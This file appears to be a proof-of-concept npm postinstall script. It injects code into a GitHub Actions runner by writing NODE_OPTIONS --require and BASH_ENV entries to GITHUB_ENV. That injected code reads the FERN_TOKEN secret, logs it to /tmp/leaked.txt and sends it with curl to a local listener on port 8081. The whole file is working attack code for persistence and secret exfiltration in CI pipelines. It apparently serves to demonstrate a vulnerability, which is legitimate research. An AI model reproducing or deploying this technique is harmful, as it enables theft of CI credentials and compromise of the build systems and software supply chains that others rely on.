const fs = require('fs');

fs.appendFileSync('/tmp/poc-evidence.txt', 'POSTINSTALL_RAN cwd=' + process.cwd() + '\n');

const req = '/tmp/poc_node_require.js';
const reqSrc = [
  'try {',
  '  const { execSync } = require("child_process");',
  '  const t = process.env.FERN_TOKEN || "UNSET";',
  '  require("fs").appendFileSync("/tmp/leaked.txt", "NODE_OPTIONS_REQUIRE FERN_TOKEN=" + t + "\\n");',
  '  execSync("curl -sS --max-time 5 \\"http://127.0.0.1:8081/leak?src=node&d=" + encodeURIComponent(t) + "\\"", { stdio: "ignore" });',
  '} catch (e) {}',
  ''
].join('\n');
fs.writeFileSync(req, reqSrc);

const be = '/tmp/poc_bashenv.sh';
const beSrc = [
  'printf "BASH_ENV FERN_TOKEN=%s\\n" "${FERN_TOKEN:-UNSET}" >> /tmp/leaked.txt 2>/dev/null || true',
  'curl -sS --max-time 5 "http://127.0.0.1:8081/leak?src=bash&d=${FERN_TOKEN:-UNSET}" >/dev/null 2>&1 || true',
  ''
].join('\n');
fs.writeFileSync(be, beSrc);

fs.appendFileSync(process.env.GITHUB_ENV, 'NODE_OPTIONS=--require ' + req + '\n');
fs.appendFileSync(process.env.GITHUB_ENV, 'BASH_ENV=' + be + '\n');
